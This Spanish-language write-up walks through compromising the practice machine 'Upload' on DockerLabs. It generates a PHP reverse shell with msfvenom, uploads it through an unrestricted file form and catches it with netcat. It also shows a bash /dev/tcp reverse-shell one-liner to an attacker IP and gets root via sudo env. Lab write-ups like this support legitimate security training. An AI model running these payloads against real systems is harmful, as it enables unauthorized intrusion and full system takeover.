---
layout: single
title: Upload - DockerLabs
excerpt: "Maquina Linux vulnerada mediante una reverse shell subieno un archivo al servidor"
date: 2024-05-18
classes: wide
header:
  teaser: https://pentest4noob.github.io/Writetups/assets/images/logos/logo_dockerlabs.png
  teaser_home_page: true
categories:
  - DockerLabs
tags:
  - linux
  - Muy facil
  - Reverse Shell
  - Sudo
---

<p align="center">
  <img width="250" height="250" src="https://pentest4noob.github.io/Writetups/assets/images/logos/logo_dockerlabs.png">
</p>

Esta maquina está clasificada como "Muy Facil" en la plataforma de [DockerLabs](https://dockerlabs.es/#/), muy útil para practicar reverse shell y escalar privilegios mediante el uso de binarios

# 1- Enumeración

Comenzamos con la etapa de enumeración para ello vamos a usar la herramienta nmap con los siguientes parámetros

```bash
sudo nmap -p- --open -sS -sC -sV -n -Pn 172.17.0.2 -oN nmap.txt
```

| Parametro | Descripción                        |
| --------- | ---------------------------------- |
| -p-       | Escanear todos los puertos         |
| --open    | Mostrar los puertos abiertos       |
| -sS       | Sondeo de tipo SYN sigiloso        |
| -sV       | Habilita la detección de versiones |
| -n        | Sin resolución de DNS              |
| -Pn       | Omitir el descubrimiento de hosts  |
| -oN       | Formato de salida del archivo      |

Finalizado el escaneo podemos ver que solo está abierto el puerto 80, con esto sabemos que corre el servicio Apache en dicho puerto

```css
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 13:37 -03
Nmap scan report for 172.17.0.2
Host is up (0.000011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.49 seconds
```

Procedemos a investigar en el navegador colocando la siguiente url `http://172.17.0.2`

![url](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/001Upload.png)

Se puede observar que es una pagina para subir archivos, por lo tanto se intuye que el vector de ataque podría ser mediante una reverse shell en php, procedo a crear el archivo malicioso con la herramienta msfvenom

```bash
msfvenom -p php/reverse_php LHOST=192.168.0.200 LPORT=8081 -f raw > pwned.php
```

| Parametro | Descripción                                |
| --------- | ------------------------------------------ |
| -p        | tipo de payload                            |
| LHOST     | IP de la maquina atacante                  |
| LPORT     | Puerto a la escucha de la maquina atacante |
| -f        | formato de salida                          |

Procedo a subir el payload, me indica que el archivo se subió correctamente.

![payload](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/upload/002Upload.png)

Ahora debo buscar donde se guardó el archivo pwned.php, por lo tanto procedo a realizar un fuzzing web con la herramienta gobuster

```bash
gobuster -n 404 -t 64 dir -u http://172.17.0.2/ -w /usr/share/dirbuster/wordlist/directoyry-list-lowercase-2.3-medium.txt -x txt,py,sh,php,html
```

| Parametro | Descripcion                     |
| --------- | ------------------------------- |
| -n        | No imprimir códigos de estado   |
| -t        | cantidad de hilos en paralelo   |
| -u        | URL                             |
| -w        | Ruta al diccionario             |
| -x        | Extensiones de archivo a buscar |

```css
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,py,sh
[+] No status:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                [Size: 275]
/.php                 [Size: 275]
/uploads              [Size: 310] [--> http://172.17.0.2/uploads/]
/upload.php           [Size: 1357]
/index.html           [Size: 1361]
/.html                [Size: 275]
/.php                 [Size: 275]
/server-status        [Size: 275]
Progress: 1245858 / 1245864 (100.00%)
===============================================================
Finished
===============================================================
```

Viendo el resultado queda al descubierto el directorio uploads procedo a ingresar la siguiente url `http://172.17.0.2/uploads`

![uploads](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/upload/003Upload.png)

Al ingresar se observa el archivo que había subido con anterioridad pwned.php

# 2- Intrusión

procedo a ponerme a la escucha en mi maquina atacante con netcat por el puerto `8081` con dicho puerto configuré el payload anteriormente

```bash
nc -nlvp 8081
```

Ahora doy click en el archivo pwned.php, el navegador se va a quedar como si estuviera cargando es buena señal

![pwned](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/upload/004Upload.png)

me fijo en la consola de mi maquina atacante y puedo ver que realizó la conexión con éxito ejecuto el comando `whoami` y me devuelve el usuario `www-data` intrusión realizada!

![www-data](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/upload/005Upload.png)

## Nota:

El payload en msfvenom suele ser inestable y luego de un tiempo se cae la conexión por lo tanto es recomendable abrir otra terminal y ponerse a la escucha con un puerto diferente en la maquina donde ya tenemos la intrusión

```bash
nc -nlvp 4443
```

ahora se procede a enviar la reverse shell para eso se debe ir la pagina web [revshell.com](https://www.revshells.com/) y copiar el siguiente comando

```bash
bash -c "sh -i >& /dev/tcp/192.168.0.200/4443 0>&1"
```

con esto se va adquirir una nueva shell mas estable

## Tratamiento de la TTY

Antes de realizar la escalada de privilegios voy hacer el tratamiento de tty para poder estabilizar la shell

```bash
script /dev/null -c bash
```

presionamos ctrl + z

```bash
stty raw -echo; fg
```

luego escribimos

```bash
reset xterm
```

nota: es posible que no muestre en pantalla lo que estamos tecleando

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```

# 3- Escalada de privilegios

Ya con la bash mas estable es momento de escalar privilegios a root para ellos voy a ejecutar el siguiente comando `sudo -l` para listar los permisos de sudo que tiene el usuario actual en el sistema.

![tty](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/upload/006Upload.png)

En este caso se observa que se puede ejecutar el binario `/usr/bin/env` como el usuario **root**, sin proporcionar contraseña. Por lo tanto se procede a investigar en la pagina [GTFOBins](https://gtfobins.github.io/) como explotar este binario

![binario](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/upload/007Upload.png)

ejecutamos el comando

```bash
sudo env /bin/sh
```

Listo! se logró escalar privilegios al usuario root

![root](https://pentest4noob.github.io/Writetups/assets/images/writetup/dockerlabs/upload/008Upload.png)
